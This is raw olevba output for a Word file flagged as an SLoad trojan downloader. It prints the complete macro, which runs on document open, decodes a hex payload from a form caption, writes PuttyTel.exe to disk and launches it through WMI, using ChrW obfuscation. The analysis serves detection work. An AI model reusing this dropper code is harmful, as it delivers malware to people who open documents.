olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: HEUR-Trojan-Downloader.MSOffice.SLoad.gen-837f40c12fc476d81d0741da2ab0bc0ee5c9857fe9623f2dfa33fb9f9d20f6ce
Type: OpenXML
WARNING  For now, VBA stomping cannot be detected for files in memory
WARNING  For now, VBA stomping cannot be detected for files in memory
-------------------------------------------------------------------------------
VBA MACRO prjDoc1.cls 
in file: word/vbaProject.bin - OLE stream: 'VBA/prjDoc1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Private Sub Document_Open()

         Dim i, d, strTemp$, strReturn$, hextostr$, CurFolder$, sFile$, sValues$
         
         hextostr = SvcPrint.Caption

         CurFolder = "C:\DataBaseLog"
        
         d = CurFolder & "\" & "PuttyTel.exe"
        
         If Right$(CurFolder, 1) <> "\" Then CurFolder = CurFolder & "\"
         MakeSureDirectoryPathExists CurFolder
            
         For i = 1 To Len(hextostr) Step 2
         strTemp = Chr(Val("&H" + Mid(hextostr, i, 2)))
         strReturn = strReturn + strTemp
         Next i
         hextostr = Right(strReturn, Len(strReturn) - 1)
        
         Open d For Output As #1
         Print #1, Chr$(77) + hextostr
         Close #1
        
         Set process = GetObject(ChrW(119) & ChrW(105) & ChrW(110) & ChrW(109) & ChrW(103) & ChrW(109) & ChrW(116) & ChrW(115) _
         & ChrW(58) & ChrW(87) & ChrW(105) & ChrW(110) & ChrW(51) & ChrW(50) & ChrW(95) & ChrW(80) & ChrW(114) _
         & ChrW(111) & ChrW(99) & ChrW(101) & ChrW(115) & ChrW(115))
         process.create d, Null, Null, processid
        
         ActiveDocument.Close _
         SaveChanges:=wdPromptToSaveChanges, _
         OriginalFormat:=wdPromptUser
        

End Sub

-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: word/vbaProject.bin - OLE stream: 'VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

#If VBA7 Then
Public Declare PtrSafe Function MakeSureDirectoryPathExists Lib "imagehlp " (ByVal lpPath As String) As Long
#Else
Public Declare Function MakeSureDirectoryPathExists Lib "imagehlp                                 " (ByVal lpPath As String) As Long
#End If
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|ChrW                |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|IOC       |PuttyTel.exe        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

